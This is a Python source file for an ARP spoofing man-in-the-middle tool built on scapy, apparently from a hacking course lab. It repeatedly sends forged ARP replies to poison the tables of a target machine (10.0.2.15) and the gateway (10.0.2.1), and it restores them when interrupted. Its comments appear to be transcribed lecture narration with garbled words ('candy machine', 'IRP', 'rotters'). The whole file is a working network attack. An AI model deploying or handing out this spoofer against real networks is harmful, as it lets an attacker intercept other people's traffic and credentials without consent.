#!/usr/bin/env python 
import scapy.all as scapy
import time 
import sys  
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast , timeout=1 , verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2 ,pdst=target_ip ,hwdst=target_mac , psrc=spoof_ip)
# we're basically sending a packet to the victim saying I have the routers Mac address.
# We're doing this by, first of all, set in the GOP field to two so that this will be sent as an IRP
# response, not a request. We're setting the destination IP, which is the IP of the target Windows machine.
# We're setting the hardware destination, which again is the Mac address of the target machine.
# And finally, we're setting the source IP to the IP of the router. So whenever this packet is
# sent and received by the target computer, they'll see that it's coming fromthe Mac address of the candy machine. 
# But they'll think this is sent by this IP, which is the rotters IP, and therefore in its IRP table,
# its associate, this IP, which is the router IP with the Mac address of the candy machine of the attacker.

# print(packet.show())
# print(packet.summary())
    scapy.send(packet , verbose=False)
# get_mac("10.0.2.1")
sent_packets_count = 0 

def restore(destination_ip , source_ip ):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2 , pdst=destination_ip, hwdst=destination_mac , psrc=source_ip , hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet , count=4 , verbose=False)
# notice that if we didn't specify the hwsrc , it will be yours , so that will not restore anythin 

target_ip = "10.0.2.15"
getway_ip = "10.0.2.1"
try:
    while True:
        spoof(target_ip , getway_ip) 
        spoof(getway_ip , target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] sent packets : " + str(sent_packets_count)),
        sys.stdout.flush()

        # sys.stdout.flush() py2 
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected CTRL C , ......Resetting ARP tables , Please wait ...... ")
    restore(target_ip , getway_ip)
    restore(getway_ip , target_ip)
